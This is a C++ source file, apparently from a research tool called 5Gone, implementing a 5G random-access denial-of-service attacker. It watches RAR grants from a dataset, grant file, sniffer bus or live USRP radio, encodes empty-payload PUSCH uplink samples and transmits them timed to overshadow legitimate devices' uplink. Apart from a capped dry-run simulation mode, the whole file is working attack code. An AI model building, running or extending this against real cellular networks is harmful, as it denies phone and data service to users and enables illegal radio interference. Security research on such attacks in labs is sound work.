#include "5gone/attack_engine.hpp"
#include "5gone/cell_sync.hpp"
#include "5gone/empty_mac_pdu.hpp"
#include "5gone/pusch_encoder.hpp"
#include "5gone/radio_uhd.hpp"
#include "5gone/rar_monitor.hpp"
#include "5gone/tdd_gate.hpp"
#include <chrono>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <memory>
#include <regex>
#include <set>
#include <thread>

namespace gone {

static std::ofstream& attack_log(const AttackConfig& cfg)
{
  static std::ofstream log;
  static std::string path;
  if (path != cfg.log_file) {
    path = cfg.log_file;
    log.open(path, std::ios::app);
  }
  return log;
}

static void log_attack(const AttackConfig& cfg, const RarEvent& ev, double advance_us, bool tx_ok)
{
  auto& log = attack_log(cfg);
  log << std::fixed << std::setprecision(1)
      << "Attacking RAR rapid=" << static_cast<int>(ev.rapid)
      << " c_rnti=" << ev.c_rnti
      << " k=" << static_cast<int>(ev.grant.k)
      << " freq_res=" << ev.grant.pusch_freq_res
      << " symbol0_advance_us=" << advance_us
      << " tx_ok=" << (tx_ok ? "true" : "false") << "\n";
  log.flush();
  std::cout << "[attack] RAR rapid=" << static_cast<int>(ev.rapid)
            << " TC-RNTI=0x" << std::hex << ev.c_rnti << std::dec
            << " advance=" << advance_us << "µs"
            << (tx_ok ? " TX" : " DRY") << "\n";
}

AttackEngine::AttackEngine(AttackConfig cfg) : cfg_(std::move(cfg)) {}

void AttackEngine::execute_attack(const RarEvent& ev)
{
  PuschEncoder encoder(cfg_);
  const std::size_t tb_bytes = ev.grant.tbs_bits / 8;
  const auto tb = build_empty_mac_pdu(tb_bytes);
  auto iq = encoder.encode(ev.grant, tb);
  if (iq.empty()) {
    std::cerr << "[attack] empty IQ — check iq_templates/ or grant params\n";
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
    return;
  }

  const double advance_sec = cfg_.symbol_advance_us / 1e6;
  const double k_slot_sec = ev.grant.k * TddGate(cfg_.scs_khz).slot_duration_sec();
  const double delay = std::max(0.0, k_slot_sec - advance_sec);

  if (cfg_.dry_run || cfg_.mode == "sim") {
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
    return;
  }

  try {
    if (shared_radio_) {
      shared_radio_->transmit(iq, delay);
      log_attack(cfg_, ev, cfg_.symbol_advance_us, true);
    } else {
      RadioUhd radio(cfg_);
      radio.transmit(iq, delay);
      log_attack(cfg_, ev, cfg_.symbol_advance_us, true);
    }
  } catch (const std::exception& e) {
    std::cerr << "[attack] radio error: " << e.what() << "\n";
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
  }
}

int AttackEngine::run_sim()
{
  RarMonitor mon(cfg_);
  const std::string ds = cfg_.dataset_dir.empty()
      ? "data/5gone-dataset" : cfg_.dataset_dir;

  std::cout << "[sim] replay RAR DoS from dataset: " << ds << "\n";
  auto events = mon.load_grants_from_dataset(ds);
  if (events.empty()) {
    std::cerr << "[sim] no RAR events — run: bash scripts/setup-lab.sh --phase 0\n";
    return 1;
  }

  cfg_.dry_run = true;
  std::size_t n = 0;
  for (const auto& ev : events) {
    if (stop_.load()) break;
    execute_attack(ev);
    ++n;
    if (n >= 10) break; // demo cap
  }
  std::cout << "[sim] processed " << n << " RAR attacks (dry-run)\n";
  return 0;
}

int AttackEngine::run_inject()
{
  if (cfg_.grant_file.empty()) {
    std::cerr << "[inject] --grant FILE required\n";
    return 1;
  }
  RarMonitor mon(cfg_);
  auto events = mon.load_grants_from_file(cfg_.grant_file);
  if (events.empty()) {
    std::cerr << "[inject] no grants in " << cfg_.grant_file << "\n";
    return 1;
  }

  std::cout << "[inject] " << events.size() << " grant(s) from " << cfg_.grant_file << "\n";
  for (const auto& ev : events) {
    if (stop_.load()) break;
    execute_attack(ev);
  }
  return 0;
}

int AttackEngine::run_live()
{
  std::cout << "[live] RAR DoS — DL monitor + UL overshadow\n";
  std::cout << "[live] NOTE: requires 2nd USRP B210 (gNB uses the first)\n";
  std::cout << "[live] PDCCH decode: use inject mode until live decode validated\n";

  RarMonitor mon(cfg_);
  CellSync sync(cfg_);
  TddGate tdd(cfg_.scs_khz);

  try {
    RadioUhd radio(cfg_);
    radio.start_streaming();
    SampleBuffer buf;
    std::size_t rounds = 0;

    while (!stop_.load() && rounds < 100000) {
      radio.recv(buf, 0.05);
      auto events = mon.scan_buffer(buf);
      for (const auto& ev : events) {
        execute_attack(ev);
      }
      ++rounds;
    }
    radio.stop_streaming();
  } catch (const std::exception& e) {
    std::cerr << "[live] " << e.what() << "\n";
    return 1;
  }

  (void)sync;
  (void)tdd;
  return 0;
}

static RarEvent parse_bus_line(const std::string& line)
{
  RarEvent ev;
  static const std::regex rapid_re(R"("rapid"\s*:\s*(\d+))");
  static const std::regex crnti_re(R"("c_rnti"\s*:\s*(\d+))");
  static const std::regex freq_re(R"("pusch_freq_res"\s*:\s*(\d+))");
  static const std::regex k_re(R"("k"\s*:\s*(\d+))");
  static const std::regex mcs_re(R"("mcs"\s*:\s*(\d+))");
  std::smatch m;
  if (std::regex_search(line, m, rapid_re)) ev.rapid = static_cast<uint8_t>(std::stoi(m[1].str()));
  if (std::regex_search(line, m, crnti_re)) {
    ev.c_rnti = static_cast<uint16_t>(std::stoi(m[1].str()));
    ev.grant.rnti = ev.c_rnti;
  }
  if (std::regex_search(line, m, freq_re)) {
    ev.ul_dci.pusch_freq_res = static_cast<uint16_t>(std::stoi(m[1].str()));
    ev.grant.pusch_freq_res = ev.ul_dci.pusch_freq_res;
  }
  if (std::regex_search(line, m, k_re)) ev.grant.k = static_cast<uint8_t>(std::stoi(m[1].str()));
  if (std::regex_search(line, m, mcs_re)) {
    ev.ul_dci.mcs = static_cast<uint8_t>(std::stoi(m[1].str()));
    ev.grant.mcs = ev.ul_dci.mcs;
  }
  ev.grant.tbs_bits = 264;
  return ev;
}

int AttackEngine::run_bus()
{
  std::cout << "[bus] watching grant bus: " << cfg_.grant_bus << "\n";
  std::cout << "[bus] pair with: bash scripts/start-sniffer.sh tail\n";

  { std::ofstream create(cfg_.grant_bus, std::ios::app); }

  std::size_t last_pos = 0;
  std::set<uint32_t> seen;
  std::unique_ptr<RadioUhd> radio;
  if (!cfg_.dry_run) {
    try {
      radio = std::make_unique<RadioUhd>(cfg_);
      radio->start_streaming();
      set_shared_radio(radio);
    } catch (const std::exception& e) {
      std::cerr << "[bus] radio init failed: " << e.what() << " — dry-run fallback\n";
      cfg_.dry_run = true;
    }
  }

  while (!stop_.load()) {
    std::ifstream in(cfg_.grant_bus);
    if (!in) {
      std::this_thread::sleep_for(std::chrono::milliseconds(50));
      continue;
    }
    in.seekg(0, std::ios::end);
    const auto end = static_cast<std::size_t>(in.tellg());
    if (end <= last_pos) {
      std::this_thread::sleep_for(std::chrono::milliseconds(50));
      continue;
    }
    in.seekg(static_cast<std::streamoff>(last_pos));
    std::string line;
    while (std::getline(in, line)) {
      if (line.empty()) continue;
      auto ev = parse_bus_line(line);
      if (ev.c_rnti == 0) continue;
      const uint32_t key = (static_cast<uint32_t>(ev.rapid) << 16) | ev.c_rnti;
      if (seen.count(key)) continue;
      seen.insert(key);
      execute_attack(ev);
    }
    last_pos = end;
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
  }

  if (radio) {
    radio->stop_streaming();
    set_shared_radio(nullptr);
  }
  return 0;
}

int AttackEngine::run()
{
  std::cout << "5Gone RAR DoS attacker — mode=" << cfg_.mode
            << " srate=" << cfg_.sample_rate / 1e6 << " MSPS\n";

  if (cfg_.mode == "sim") return run_sim();
  if (cfg_.mode == "inject") return run_inject();
  if (cfg_.mode == "live") return run_live();
  if (cfg_.mode == "bus") return run_bus();

  std::cerr << "unknown mode: " << cfg_.mode << " (use sim|inject|live|bus)\n";
  return 1;
}

} // namespace gone
